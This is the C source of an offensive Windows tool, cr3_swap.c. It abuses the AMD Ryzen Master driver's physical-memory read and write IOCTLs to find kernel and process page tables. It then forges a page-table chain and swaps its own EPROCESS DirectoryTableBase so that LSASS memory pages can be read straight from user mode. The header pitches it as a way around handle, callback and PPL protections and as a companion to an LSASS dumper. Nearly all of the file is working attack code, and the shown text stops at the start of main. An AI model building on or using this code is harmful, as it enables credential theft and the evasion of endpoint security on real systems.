/*
 * cr3_swap.c — Physical Page Mapping via EPROCESS CR3 Swap
 *
 * Core insight (correcting section 3.1 draft):
 *   The draft says "copy kernel-half PML4 from System → target process". This
 *   is a no-op — all Windows processes already share identical kernel-half PML4
 *   entries (256-511). They point to the same physical PDPT pages.
 *
 *   CORRECT technique: inject new entries at UNUSED user-half slots (0-255)
 *   pointing to custom PT chain where each leaf PTE has U/S=1. Ring-3 code can
 *   then directly dereference those VAs → reads from the mapped physical pages.
 *   SMAP only blocks access to Supervisor (U/S=0) pages — our custom PTEs have
 *   U/S=1 → SMAP does not apply.
 *
 * What this enables (zero API, zero handles, zero OB callbacks, zero PPL bypass):
 *   1. Map LSASS physical pages into own process VA space
 *   2. Read those pages via direct pointer dereference
 *   3. Useful as a complementary primitive to lsass_dump.c (no page-table-walk
 *      per read — after one-time setup, reads are native speed)
 *
 * Why Sleep() triggers CR3 reload:
 *   EPROCESS.DirectoryTableBase is loaded into CR3 register on every context
 *   switch TO this process (KiSwapContext → SwapContext). Sleep(N) forces our
 *   thread to be descheduled; when another process runs and returns to us, the
 *   scheduler executes: mov cr3, [KPROCESS.DirectoryTableBase] → our new PML4.
 *   Single-threaded process: Sleep() always switches to a different process →
 *   guaranteed CR3 reload on return.
 *
 * KPTI note (AMD Ryzen, Win11):
 *   AMD CPUs are not Meltdown-vulnerable (CVE-2017-5754) → Windows disables KPTI
 *   on AMD. DirectoryTableBase == UserDirectoryTableBase → updating +0x28 alone
 *   suffices. We verify this at runtime and warn if KPTI appears active.
 *
 * Build:
 *   x86_64-w64-mingw32-gcc -O2 -Wall -Wno-unused-function \
 *       -o cr3_swap.exe cr3_swap.c
 *
 * Usage:
 *   cr3_swap.exe                  — map first 16 LSASS pages, dump to lsass_mapped.bin
 *   cr3_swap.exe <PA_hex>         — map a single specific physical address
 *
 * Requires: AMDRyzenMasterDriverV20 loaded. Admin rights.
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <inttypes.h>

/* ══════════════════════════════════════════════════════════════════════════
 * §1  AMD DRIVER PRIMITIVES
 * ══════════════════════════════════════════════════════════════════════════ */

#define DEVICE_NAME      L"\\\\.\\AMDRyzenMasterDriverV20"
#define IOCTL_PHYS_READ  0x81112F08u
#define IOCTL_PHYS_WRITE 0x81112F0Cu
static HANDLE g_dev = INVALID_HANDLE_VALUE;

#define MAX_RANGES 64
typedef struct { uint64_t base, size; } PhysRange;
static PhysRange g_ranges[MAX_RANGES];
static int g_nranges = 0;

static void load_ranges(void)
{
    HKEY h;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "HARDWARE\\RESOURCEMAP\\System Resources\\Physical Memory",
        0, KEY_READ, &h) != ERROR_SUCCESS) return;
    char vname[256]; DWORD vn, vd, type;
    uint8_t *buf = NULL; DWORD sz = 0;
    for (DWORD i = 0;;i++) {
        vn = sizeof vname; vd = 0;
        if (RegEnumValueA(h,i,vname,&vn,NULL,&type,NULL,&vd) == ERROR_NO_MORE_ITEMS) break;
        if ((type!=3 && type!=8) || vd<20) continue;
        buf = (uint8_t*)malloc(vd); if (!buf) continue;
        if (RegQueryValueExA(h,vname,NULL,NULL,buf,&vd) == ERROR_SUCCESS) { sz=vd; break; }
        free(buf); buf = NULL;
    }
    RegCloseKey(h);
    if (!buf || sz<20) { free(buf); return; }
    DWORD cnt = *(DWORD*)(buf+16); uint8_t *p = buf+20;
    for (DWORD i = 0; i<cnt && g_nranges<MAX_RANGES; i++, p+=20) {
        if (p+20>buf+sz || p[0]!=3) continue;
        g_ranges[g_nranges].base = *(uint64_t*)(p+4);
        g_ranges[g_nranges].size = *(uint64_t*)(p+12);
        printf("  [range %d]  PA 0x%012"PRIX64" + %"PRIu64" MB\n",
               g_nranges, g_ranges[g_nranges].base,
               g_ranges[g_nranges].size >> 20);
        g_nranges++;
    }
    free(buf);
}

static int pa_in_range(uint64_t pa, uint32_t sz)
{
    for (int i = 0; i<g_nranges; i++)
        if (pa >= g_ranges[i].base && pa+sz <= g_ranges[i].base+g_ranges[i].size) return 1;
    return 0;
}

#define IO_BUFSZ (4096 + 12)
static uint8_t g_io_buf[IO_BUFSZ];

static int phys_read(uint64_t pa, void *buf, uint32_t sz)
{
    uint8_t in[12]; *(uint64_t*)in = pa; *(uint32_t*)(in+8) = sz;
    uint32_t osz = 12+sz;
    uint8_t *out; void *dyn = NULL;
    if (osz <= IO_BUFSZ) out = g_io_buf;
    else { dyn = malloc(osz); if (!dyn) return 0; out = (uint8_t*)dyn; }
    DWORD got = 0;
    BOOL ok = DeviceIoControl(g_dev, IOCTL_PHYS_READ, in, 12, out, osz, &got, NULL);
    if (ok && got >= 12) memcpy(buf, out+12, sz);
    free(dyn);
    return ok && got >= 12;
}

static int phys_write(uint64_t pa, const void *data, uint32_t sz)
{
    if (!pa_in_range(pa, sz)) {
        printf("  [!] BLOCKED write PA 0x%"PRIX64" — not in RAM range\n", pa);
        return 0;
    }
    uint32_t isz = 12+sz;
    uint8_t *in = (uint8_t*)malloc(isz); if (!in) return 0;
    *(uint64_t*)in = pa; *(uint32_t*)(in+8) = sz;
    memcpy(in+12, data, sz);
    DWORD got = 0;
    BOOL ok = DeviceIoControl(g_dev, IOCTL_PHYS_WRITE, in, isz, NULL, 0, &got, NULL);
    free(in);
    return ok;
}

/* ══════════════════════════════════════════════════════════════════════════
 * §2  KERNEL CR3 + PAGE TABLE WALK
 * ══════════════════════════════════════════════════════════════════════════ */

static uint64_t g_kernel_cr3 = 0;

static uint64_t cr3_walk(uint64_t cr3, uint64_t va)
{
    uint64_t i4=(va>>39)&0x1FF, i3=(va>>30)&0x1FF, i2=(va>>21)&0x1FF, i1=(va>>12)&0x1FF;
    uint64_t e = 0;
    if (!phys_read(cr3+i4*8, &e, 8) || !(e&1)) return 0;
    if (!phys_read((e&0x000FFFFFFFFFF000ULL)+i3*8, &e, 8) || !(e&1)) return 0;
    if (e&(1ULL<<7)) return (e&0x000FFFFFC0000000ULL)|(va&0x3FFFFFFF);
    if (!phys_read((e&0x000FFFFFFFFFF000ULL)+i2*8, &e, 8) || !(e&1)) return 0;
    if (e&(1ULL<<7)) return (e&0x000FFFFFFFE00000ULL)|(va&0x1FFFFF);
    if (!phys_read((e&0x000FFFFFFFFFF000ULL)+i1*8, &e, 8) || !(e&1)) return 0;
    return (e&0x000FFFFFFFFFF000ULL)|(va&0xFFF);
}

static uint64_t kva_to_pa(uint64_t va) { return cr3_walk(g_kernel_cr3, va); }

static uint64_t get_ntoskrnl_va(void)
{
    typedef NTSTATUS (NTAPI *NtQSI_t)(ULONG,PVOID,ULONG,PULONG);
    NtQSI_t fn = (NtQSI_t)GetProcAddress(GetModuleHandleA("ntdll.dll"),
                                           "NtQuerySystemInformation");
    if (!fn) return 0;
    typedef struct { HANDLE S; PVOID MB,IB; ULONG IS,F; USHORT L,I,Lc,O; CHAR P[256]; } MOD;
    typedef struct { ULONG C; MOD M[1]; } MODLIST;
    ULONG sz = 0x40000; MODLIST *ml = NULL; NTSTATUS st;
    do { free(ml); ml=(MODLIST*)malloc(sz*=2); if(!ml) return 0;
         st=fn(11,ml,sz,NULL); } while(st==(NTSTATUS)0xC0000004L);
    uint64_t va = 0;
    if (st==0) va = (uint64_t)ml->M[0].IB;
    free(ml); return va;
}

static uint64_t find_kernel_cr3(uint64_t nt_va)
{
    uint32_t nt_pml4i = nt_va ? (uint32_t)((nt_va>>39)&0x1FF) : 0;
    static uint8_t pg[4096];

    /* Pass 1: classic self-ref at slot 0x1ED (pre-Win10-1703) */
    for (int ri = 0; ri < g_nranges; ri++) {
        if (g_ranges[ri].base >= 0x10000000ULL) continue;
        uint64_t re = g_ranges[ri].base + g_ranges[ri].size;
        if (re > 0x10000000ULL) re = 0x10000000ULL;
        for (uint64_t pa = g_ranges[ri].base; pa < re; pa += 0x1000) {
            uint64_t e = 0;
            if (!phys_read(pa+0x1ED*8, &e, 8)) continue;
            if (!((e&1) && (e&0x000FFFFFFFFFF000ULL)==pa)) continue;
            if (nt_pml4i) { uint64_t ke=0; if(!phys_read(pa+nt_pml4i*8,&ke,8)||!(ke&1)) continue; }
            return pa;
        }
    }

    /* Pass 2: randomised self-ref slot (Win10-1703+ / Win11 22H2+), scan first 64 MB */
    for (int ri = 0; ri < g_nranges; ri++) {
        if (g_ranges[ri].base >= 0x4000000ULL) continue;
        uint64_t re = g_ranges[ri].base + g_ranges[ri].size;
        if (re > 0x4000000ULL) re = 0x4000000ULL;
        for (uint64_t pa = g_ranges[ri].base; pa < re; pa += 0x1000) {
            if (!phys_read(pa, pg, 4096)) continue;
            for (int idx = 0x100; idx < 0x200; idx++) {
                uint64_t e = *(uint64_t*)(pg+idx*8);
                if (!(e&1)) continue;
                if ((e&0x000FFFFFFFFFF000ULL) != pa) continue;
                if (nt_pml4i) { uint64_t ke=*(uint64_t*)(pg+nt_pml4i*8); if(!(ke&1)) continue; }
                return pa;
            }
        }
    }

    if (nt_va) return find_kernel_cr3(0);
    return 0;
}

/* ══════════════════════════════════════════════════════════════════════════
 * §3  EPROCESS HELPERS
 * ══════════════════════════════════════════════════════════════════════════ */

#define OFF_DTB   0x028u   /* Pcb.DirectoryTableBase — rock-solid across all Win builds */
#define OFF_PID   0x440u   /* Win10-1903+ / Win11 */
#define OFF_FLINK 0x448u
#define OFF_NAME  0x5A8u

static void enable_debug_priv(void)
{
    HANDLE tok = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY, &tok)) return;
    TOKEN_PRIVILEGES tp = {1};
    if (LookupPrivilegeValueA(NULL, "SeDebugPrivilege", &tp.Privileges[0].Luid))
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(tok, FALSE, &tp, sizeof tp, NULL, NULL);
    CloseHandle(tok);
}

/*
 * scan_eproc_physical — brute-force RAM scan for EPROCESS by PID + name.
 *
 * WHY needed: on Hyper-V, SLAT (Second Level Address Translation) protects the
 * kernel's page table pages from guest physical reads. kva_to_pa walks those
 * page tables → reads fail → returns 0. Same root cause as DKOM Method A/B
 * failing on Hyper-V (documented in dkom_hide.c).
 *
 * EPROCESS pool pages themselves are NOT page-table pages → SLAT does not
 * protect them → phys_read succeeds → we can find EPROCESS this way.
 *
 * WHY 8KB reads: EPROCESS spans ~0x8C0 bytes. PID at +0x440, name at +0x5A8
 * (delta = 0x168). If PID field is near a 4KB page boundary, name spills to
 * the next physical page. Reading 8KB at a time handles the cross-page case
 * without complex overlap logic.
 */
static uint64_t scan_eproc_physical(uint32_t pid, const char *name)
{
    static const struct { uint32_t off_pid; uint32_t off_name; } layouts[] = {
        { 0x440, 0x5A8 },  /* Win10-1903+ / Win11 (including 26200) */
        { 0x2E8, 0x450 },  /* Win10-1709/1803/1809 */
        { 0x2E0, 0x448 },  /* Win10-1507-1803 */
    };
    const int n_layouts = 3;
    size_t nlen = strlen(name); if (nlen > 14) nlen = 14;

    /* 8KB scan buffer — handles PID + name even across a 4KB page boundary */
    uint8_t *buf = (uint8_t*)malloc(8192);
    if (!buf) return 0;

    uint64_t result = 0;
    for (int ri = 0; ri < g_nranges && !result; ri++) {
        uint64_t rend = g_ranges[ri].base + g_ranges[ri].size;
        for (uint64_t pa = g_ranges[ri].base; pa < rend && !result; pa += 4096) {
            /* Read 8KB: current page + (possibly) next page */
            uint32_t rd = (pa + 8192 <= rend) ? 8192 : 4096;
            if (!phys_read(pa, buf, rd)) continue;

            /* Stride-8 scan of first 4KB for UniqueProcessId */
            for (uint32_t off = 0; off + 24 <= 4096; off += 8) {
                uint64_t v; memcpy(&v, buf + off, 8);
                /* PID must match and upper 32 bits must be 0 */
                if ((uint32_t)v != pid || (v >> 32)) continue;

                /* ActiveProcessLinks.Flink at off+8, Blink at off+16 */
                uint64_t fl, bl;
                memcpy(&fl, buf + off + 8,  8);
                memcpy(&bl, buf + off + 16, 8);
                if ((fl >> 48) != 0xFFFF || (bl >> 48) != 0xFFFF) continue;
                if ((fl & 7) || (bl & 7) || fl == bl) continue;

                for (int li = 0; li < n_layouts; li++) {
                    int64_t ep = (int64_t)off - (int64_t)layouts[li].off_pid;
                    if (ep < 0) continue;  /* EPROCESS would start before this page */

                    uint64_t nm_off = (uint64_t)ep + layouts[li].off_name;
                    if (nm_off + 15 > (uint64_t)rd) continue; /* beyond our 8KB read */

                    char nm[16] = {0};
                    memcpy(nm, buf + nm_off, 15);
                    if (_strnicmp(nm, name, nlen) != 0) continue;

                    uint64_t eproc_pa = pa + (uint64_t)ep;
                    if (eproc_pa & 0xF) continue; /* pool: ≥16-byte aligned */

                    printf("  [scan] EPROCESS PA=0x%012"PRIX64"  layout=%d  name='%s'\n",
                           eproc_pa, li, nm);
                    result = eproc_pa;
                    break;
                }
                if (result) break;
            }
        }
    }
    free(buf);
    return result;
}

/*
 * find_own_eproc_pa — physical address of our own EPROCESS.
 *
 * Method A (fast): HandleInfo → EPROCESS KVA → kva_to_pa.
 *   Works on physical machines where SLAT does not block kernel pool reads.
 * Method B (Hyper-V fallback): RAM scan for PID + exe name.
 *   Works because EPROCESS pool pages are not SLAT-protected (only page TABLE
 *   pages are protected on Hyper-V).
 */
static uint64_t find_own_eproc_pa(void)
{
    typedef NTSTATUS (NTAPI *NtQSI_t)(ULONG,PVOID,ULONG,PULONG);
    NtQSI_t fn = (NtQSI_t)GetProcAddress(GetModuleHandleA("ntdll.dll"),
                                           "NtQuerySystemInformation");
    if (fn) {
        HANDLE hself = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, GetCurrentProcessId());
        if (hself) {
            typedef struct {
                ULONG ProcessId; UCHAR ObjType, Flags; USHORT Handle;
                PVOID Object; ACCESS_MASK Access;
            } SHE;
            typedef struct { ULONG Count; SHE H[1]; } SHI;

            ULONG sz = 0x40000; SHI *info = NULL; NTSTATUS st;
            do { free(info); info=(SHI*)malloc(sz*=2);
                 if(!info) break;
                 st=fn(0x10,info,sz,NULL); } while(st==(NTSTATUS)0xC0000004L);

            uint64_t eproc_kva = 0;
            if (info && st==0) {
                DWORD pid = GetCurrentProcessId();
                USHORT h = (USHORT)(uintptr_t)hself;
                for (ULONG i = 0; i < info->Count; i++) {
                    if (info->H[i].ProcessId == pid && info->H[i].Handle == h) {
                        eproc_kva = (uint64_t)info->H[i].Object; break;
                    }
                }
            }
            free(info); CloseHandle(hself);

            if (eproc_kva) {
                uint64_t pa = kva_to_pa(eproc_kva);
                if (pa) { printf("  [*] Own EPROCESS via HandleInfo+kva_to_pa\n"); return pa; }
                printf("  [!] kva_to_pa(0x%"PRIX64")=0 — Hyper-V SLAT? Falling back to RAM scan\n",
                       eproc_kva);
            }
        }
    }

    /* Fallback: RAM scan — slower (~5-30s) but Hyper-V compatible */
    char exe_path[MAX_PATH]; GetModuleFileNameA(NULL, exe_path, sizeof exe_path);
    char *p = strrchr(exe_path, '\\'); const char *exe = p ? p+1 : exe_path;
    printf("  [*] RAM scan for EPROCESS (PID=%lu name='%s')...\n",
           (unsigned long)GetCurrentProcessId(), exe);
    return scan_eproc_physical(GetCurrentProcessId(), exe);
}

/*
 * find_proc_pa — walk ActiveProcessLinks from known EPROCESS PA to find target.
 *
 * WHY this needs kva_to_pa: Flink is a kernel VA (pointer to next EPROCESS's
 * Flink field). Converting it to PA requires walking kernel page tables.
 * On Hyper-V, kva_to_pa fails (SLAT blocks page table reads) → returns 0.
 * Caller should fall back to scan_eproc_physical for Hyper-V compatibility.
 */
static uint64_t find_proc_pa(uint64_t start_eproc_pa, const char *target_name,
                               uint32_t target_pid)
{
    uint8_t buf[0x5C0];
    uint64_t cur_pa = start_eproc_pa;
    const int MAX_ITER = 2048;

    for (int iter = 0; iter < MAX_ITER; iter++) {
        if (!phys_read(cur_pa, buf, sizeof buf)) break;

        uint64_t flink;
        memcpy(&flink, buf + OFF_FLINK, 8);
        if ((flink >> 48) != 0xFFFF) break;

        uint64_t next_eproc_kva = flink - OFF_FLINK;
        uint64_t next_eproc_pa  = kva_to_pa(next_eproc_kva);
        /* kva_to_pa returns 0 on Hyper-V — caller detects and falls back */
        if (!next_eproc_pa || next_eproc_pa == start_eproc_pa) break;

        uint8_t nbuf[0x5C0];
        if (!phys_read(next_eproc_pa, nbuf, sizeof nbuf)) { cur_pa = next_eproc_pa; continue; }

        /* Check PID */
        uint64_t pid_val; memcpy(&pid_val, nbuf + OFF_PID, 8);
        /* Check name */
        char name[16] = {0};
        memcpy(name, nbuf + OFF_NAME, 15);

        int pid_match  = target_pid  && (uint32_t)pid_val == target_pid;
        int name_match = target_name && _stricmp(name, target_name) == 0;

        if (pid_match || name_match) {
            printf("  [+] Found '%s' PID=%u  EPROCESS PA=0x%012"PRIX64"\n",
                   name, (uint32_t)pid_val, next_eproc_pa);
            return next_eproc_pa;
        }

        cur_pa = next_eproc_pa;
    }
    return 0;
}

/* ══════════════════════════════════════════════════════════════════════════
 * §4  COLLECT TARGET PHYSICAL PAGES
 * ══════════════════════════════════════════════════════════════════════════ */

/*
 * collect_proc_pages_at_va — walk the target process's page tables starting at
 * a given VA to collect consecutive mapped physical pages.
 *
 * WHY start from a specific VA (not scan all): scanning 256 PML4 entries would
 * require up to 256+ IOCTLs per level. Starting at the image base VA calculates
 * the exact PML4/PDPT/PD/PT indices directly → O(n_pages) IOCTLs only.
 */
static int collect_proc_pages_at_va(uint64_t proc_cr3, uint64_t start_va,
                                     uint64_t *pas_out, int max_pages)
{
    int found = 0;
    for (int i = 0; i < max_pages; i++) {
        uint64_t va  = start_va + (uint64_t)i * 0x1000;
        uint64_t pa  = cr3_walk(proc_cr3, va);
        if (!pa) {
            printf("  [~] VA 0x%016"PRIX64" not mapped (page %d) — skipping\n", va, i);
            continue;
        }
        pas_out[found++] = pa;
        printf("  [page %2d]  VA 0x%016"PRIX64" → PA 0x%012"PRIX64"\n", i, va, pa);
    }
    return found;
}

/* ══════════════════════════════════════════════════════════════════════════
 * §5  CR3 SWAP — BUILD CUSTOM PAGE TABLE CHAIN
 * ══════════════════════════════════════════════════════════════════════════ */

/*
 * PTE/PDE/PDPTE/PML4E flag bits:
 *   bit 0   Present
 *   bit 1   R/W
 *   bit 2   U/S  — user-accessible (ring 3 can read/write)
 *   bit 5   Accessed (set to avoid lazy #PF on some CPUs/hypervisors)
 *   bit 6   Dirty (for leaf PTEs mapping actual pages)
 *   bit 63  NX — set for data pages, clear for code pages
 *
 * PTE_TABLE: flags for non-leaf entries (PML4→PDPT→PD→PT)
 * PTE_PAGE:  flags for leaf entries pointing to actual physical pages
 */
#define PTE_TABLE  0x27ULL          /* P+RW+US+Accessed+Dirty */
#define PTE_PAGE   (0x27ULL | (1ULL<<63))  /* PTE_TABLE + NX (data only) */

typedef struct {
    /* 4 pinned userspace pages acting as page table levels */
    uint8_t *pml4_buf;   /* Copy of own PML4 + 1 injected entry */
    uint8_t *pdpt_buf;
    uint8_t *pd_buf;
    uint8_t *pt_buf;     /* PT: maps up to 512 physical pages */

    uint64_t pml4_pa;
    uint64_t pdpt_pa;
    uint64_t pd_pa;
    uint64_t pt_pa;

    uint32_t pml4_slot;   /* PML4 index we injected (1..254) */
    uint64_t map_va_base; /* User VA where mapping starts: slot << 39 */
    uint32_t n_pages;     /* Number of physical pages mapped */
} Cr3Mapping;

/*
 * alloc_pinned_page — VirtualAlloc 4KB, VirtualLock (pin in RAM), return PA.
 *
 * WHY VirtualLock: prevents the OS from paging the buffer out during the ~10ms
 * window between phys_write and Sleep+resume. Without it, if the page gets
 * swapped out, our PML4 entry points to stale/reused physical storage → BSOD.
 * VirtualLock may fail without SeLockMemoryPrivilege; we warn and proceed
 * (acceptable risk on non-memory-pressured systems for this short window).
 *
 * WHY own_dtb (not g_kernel_cr3) for the VA→PA walk:
 *   VirtualAlloc gives a USER-MODE VA. The kernel CR3 (g_kernel_cr3) only has
 *   kernel-half PML4 entries (256-511) — user-mode VAs are NOT mapped there.
 *   Our own EPROCESS.DirectoryTableBase maps our user-mode pages. ✅
 */
static uint8_t* alloc_pinned_page(uint64_t own_dtb, uint64_t *pa_out)
{
    uint8_t *p = (uint8_t*)VirtualAlloc(NULL, 4096,
                                         MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (!p) { printf("  [-] VirtualAlloc failed: %lu\n", GetLastError()); return NULL; }

    if (!VirtualLock(p, 4096))
        printf("  [!] VirtualLock failed (%lu) — page may page out; risk accepted\n",
               GetLastError());

    memset(p, 0, 4096);

    /* Walk OWN process's user page tables to get this buffer's physical address */
    *pa_out = cr3_walk(own_dtb, (uint64_t)p);
    if (!*pa_out) {
        printf("  [-] cr3_walk(own_dtb, buf_va) = 0 — page not yet committed?\n");
        VirtualFree(p, 0, MEM_RELEASE);
        return NULL;
    }
    return p;
}

/*
 * cr3_build_mapping — construct PML4+PDPT+PD+PT chain mapping target_pas[].
 *
 * Page table structure for mapping N pages at VA = (pml4_slot << 39):
 *
 *   PML4[pml4_slot] → PDPT_PA
 *   PDPT[0]         → PD_PA
 *   PD[0]           → PT_PA
 *   PT[0..N-1]      → target_pas[0..N-1]   (each U/S=1 → ring-3 accessible)
 *
 * WHY this doesn't need any kernel cooperation: physical R/W bypasses all
 * virtual memory protections. We write directly to the new PML4 physical page.
 * The CPU's page table walker is hardware; it reads any PA we put in those entries.
 */
static int cr3_build_mapping(Cr3Mapping *m, uint64_t own_eproc_pa,
                              const uint64_t *target_pas, int n_pages)
{
    memset(m, 0, sizeof *m);
    if (n_pages > 512) n_pages = 512;

    /* Get own DTB (our user-mode CR3) for VA→PA translation of our buffers */
    uint64_t own_dtb = 0;
    if (!phys_read(own_eproc_pa + OFF_DTB, &own_dtb, 8) || !own_dtb) {
        printf("  [-] Failed to read own DTB\n"); return 0;
    }
    printf("  [*] Own DTB (user CR3) = 0x%"PRIX64"\n", own_dtb);

    /* Allocate 4 pinned pages */
    m->pml4_buf = alloc_pinned_page(own_dtb, &m->pml4_pa);
    m->pdpt_buf = alloc_pinned_page(own_dtb, &m->pdpt_pa);
    m->pd_buf   = alloc_pinned_page(own_dtb, &m->pd_pa);
    m->pt_buf   = alloc_pinned_page(own_dtb, &m->pt_pa);
    if (!m->pml4_buf || !m->pdpt_buf || !m->pd_buf || !m->pt_buf) return 0;

    printf("  [*] PML4 buf  VA=0x%p  PA=0x%012"PRIX64"\n", m->pml4_buf, m->pml4_pa);
    printf("  [*] PDPT buf  PA=0x%012"PRIX64"\n", m->pdpt_pa);
    printf("  [*] PD   buf  PA=0x%012"PRIX64"\n", m->pd_pa);
    printf("  [*] PT   buf  PA=0x%012"PRIX64"\n", m->pt_pa);

    /* Read own CURRENT PML4 (so we preserve all existing mappings) */
    if (!phys_read(own_dtb & ~0xFFFULL, m->pml4_buf, 4096)) {
        printf("  [-] Failed to read own PML4\n"); return 0;
    }

    /* Find unused user-half PML4 slot (entries 1..254)
     * WHY skip 0: VA range 0x0000000000000000 area — null-ptr territory, skip.
     * WHY skip 255: high user VA (0x7F8000000000) — Windows heap/stack, might be used. */
    uint64_t *pml4_e = (uint64_t*)m->pml4_buf;
    for (uint32_t i = 1; i < 255; i++) {
        if (!(pml4_e[i] & 1)) {   /* not present → slot is free */
            m->pml4_slot = i;
            break;
        }
    }
    if (!m->pml4_slot) { printf("  [-] No free PML4 user slot found!\n"); return 0; }

    m->map_va_base = (uint64_t)m->pml4_slot << 39;
    m->n_pages     = (uint32_t)n_pages;
    printf("  [*] Using PML4 slot %u → mapping VA base = 0x%016"PRIX64"\n",
           m->pml4_slot, m->map_va_base);

    /* Build PT: leaf entries pointing to each target physical page */
    uint64_t *pt_e = (uint64_t*)m->pt_buf;
    for (int i = 0; i < n_pages; i++)
        pt_e[i] = (target_pas[i] & 0x000FFFFFFFFFF000ULL) | PTE_PAGE;

    /* Build PD → PT, PDPT → PD */
    ((uint64_t*)m->pd_buf)[0]   = (m->pt_pa   & 0x000FFFFFFFFFF000ULL) | PTE_TABLE;
    ((uint64_t*)m->pdpt_buf)[0] = (m->pd_pa   & 0x000FFFFFFFFFF000ULL) | PTE_TABLE;

    /* Inject new entry in our custom PML4 copy */
    pml4_e[m->pml4_slot] = (m->pdpt_pa & 0x000FFFFFFFFFF000ULL) | PTE_TABLE;

    /* Write all 4 page table pages to physical memory.
     * WHY write PML4 last: if we wrote PML4 first and the CPU walked it before
     * PDPT/PD/PT were written, it might see garbage entries. Write bottom-up. */
    if (!phys_write(m->pt_pa,   m->pt_buf,   4096)) { printf("  [-] phys_write PT\n");   return 0; }
    if (!phys_write(m->pd_pa,   m->pd_buf,   4096)) { printf("  [-] phys_write PD\n");   return 0; }
    if (!phys_write(m->pdpt_pa, m->pdpt_buf, 4096)) { printf("  [-] phys_write PDPT\n"); return 0; }
    if (!phys_write(m->pml4_pa, m->pml4_buf, 4096)) { printf("  [-] phys_write PML4\n"); return 0; }

    printf("  [+] Page table chain written to physical memory\n");
    return 1;
}

/* ══════════════════════════════════════════════════════════════════════════
 * §6  CR3 SWAP APPLY / RESTORE
 * ══════════════════════════════════════════════════════════════════════════ */

/*
 * cr3_swap_apply — write new PML4 PA to EPROCESS.DirectoryTableBase, force reload.
 *
 * After this returns, the CPU's CR3 register for our thread points to the new
 * PML4 (which has all original entries + our injected slot).
 *
 * KPTI detection: on AMD Win11 KPTI is off → DTB == UDTB.
 * We probe candidate UserDirectoryTableBase offsets and update if they match
 * the original DTB value. This ensures correctness even if KPTI is on.
 */
static int cr3_swap_apply(const Cr3Mapping *m, uint64_t own_eproc_pa,
                           uint64_t *orig_dtb_out)
{
    /* Save original DTB for restore */
    if (!phys_read(own_eproc_pa + OFF_DTB, orig_dtb_out, 8)) return 0;
    printf("  [*] Original DTB = 0x%"PRIX64"\n", *orig_dtb_out);
    printf("  [*] New     DTB  = 0x%"PRIX64"\n", m->pml4_pa);

    /* Write new PML4 PA to EPROCESS.DirectoryTableBase (+0x028) */
    if (!phys_write(own_eproc_pa + OFF_DTB, &m->pml4_pa, 8)) return 0;

    /* AMD Win11: also check common UserDirectoryTableBase offsets.
     * If the value at a candidate offset == orig_dtb, this is likely UDTB.
     * Update it too so KPTI-enabled paths also get the new PML4.
     * Known offsets: Win11 21H2=0x380, 22H2/23H2/24H2=0x388 */
    static const uint32_t udtb_candidates[] = { 0x388, 0x380, 0x390 };
    for (int i = 0; i < 3; i++) {
        uint64_t v = 0;
        if (phys_read(own_eproc_pa + udtb_candidates[i], &v, 8) && v == *orig_dtb_out) {
            phys_write(own_eproc_pa + udtb_candidates[i], &m->pml4_pa, 8);
            printf("  [*] Also updated UserDirectoryTableBase at +0x%X\n",
                   udtb_candidates[i]);
        }
    }

    /* Force context switch: Sleep causes our thread to be descheduled.
     * When the scheduler returns to us (from a different process's context),
     * it executes: mov cr3, [KPROCESS.DirectoryTableBase] → loads our new PML4.
     * Single-threaded process: Sleep always crosses a process boundary. ✅ */
    printf("  [*] Sleeping 15ms to force context switch + CR3 reload...\n");
    Sleep(15);
    printf("  [+] Resumed. CR3 should now point to custom PML4.\n");
    return 1;
}

static void cr3_swap_restore(uint64_t own_eproc_pa, uint64_t orig_dtb,
                              const Cr3Mapping *m)
{
    phys_write(own_eproc_pa + OFF_DTB, &orig_dtb, 8);

    /* Restore UDTB candidates that we might have updated */
    static const uint32_t udtb_candidates[] = { 0x388, 0x380, 0x390 };
    for (int i = 0; i < 3; i++) {
        uint64_t v = 0;
        if (phys_read(own_eproc_pa + udtb_candidates[i], &v, 8) && v == m->pml4_pa)
            phys_write(own_eproc_pa + udtb_candidates[i], &orig_dtb, 8);
    }

    printf("  [*] Restoring CR3... sleeping 15ms\n");
    Sleep(15);
    printf("  [+] CR3 restored to 0x%"PRIX64"\n", orig_dtb);
}

static void cr3_mapping_free(Cr3Mapping *m)
{
    /* CRITICAL ORDER: free AFTER CR3 is restored.
     * VirtualFree while our PML4 still references these pages = BSOD.
     * The caller must call cr3_swap_restore() BEFORE this function. */
    if (m->pml4_buf) { VirtualUnlock(m->pml4_buf, 4096); VirtualFree(m->pml4_buf, 0, MEM_RELEASE); }
    if (m->pdpt_buf) { VirtualUnlock(m->pdpt_buf, 4096); VirtualFree(m->pdpt_buf, 0, MEM_RELEASE); }
    if (m->pd_buf)   { VirtualUnlock(m->pd_buf,   4096); VirtualFree(m->pd_buf,   0, MEM_RELEASE); }
    if (m->pt_buf)   { VirtualUnlock(m->pt_buf,   4096); VirtualFree(m->pt_buf,   0, MEM_RELEASE); }
    memset(m, 0, sizeof *m);
}

/* ══════════════════════════════════════════════════════════════════════════
 * §7  READ VIA MAPPED VA
 *
 * AMD Ryzen + Win11 (no KPTI): direct pointer dereference works after Sleep.
 * KPTI-enabled systems (Intel): access would fault — process crashes.
 *   Fix if needed: use a dedicated thread + TerminateThread on timeout,
 *   or enumerate/update UserDirectoryTableBase offset via IDA symbols.
 *
 * WHY not use VEH for fault recovery: VEH can observe the fault but cannot
 * resume past it without fixing RIP manually (requires knowing instruction
 * length) — fragile. For AMD PoC, direct read is correct and safe.
 * ══════════════════════════════════════════════════════════════════════════ */

static int try_read_mapped(uint64_t map_va_base, uint8_t *out, uint32_t sz)
{
    /* Sanity: verify page is within user VA range (< 0x7FFFFFFFFFFF) */
    if (map_va_base >= 0x800000000000ULL) {
        printf("  [!] map_va_base 0x%"PRIX64" out of user VA range\n", map_va_base);
        return 0;
    }
    memcpy(out, (void*)(uintptr_t)map_va_base, sz);
    return 1;
}

/* ══════════════════════════════════════════════════════════════════════════
 * §8  MAIN
 * ══════════════════════════════════════════════════════════════════════════ */

int main(int argc, char *argv[])
{
    printf("=== CR3 Swap Physical Page Mapper ===\n\n");
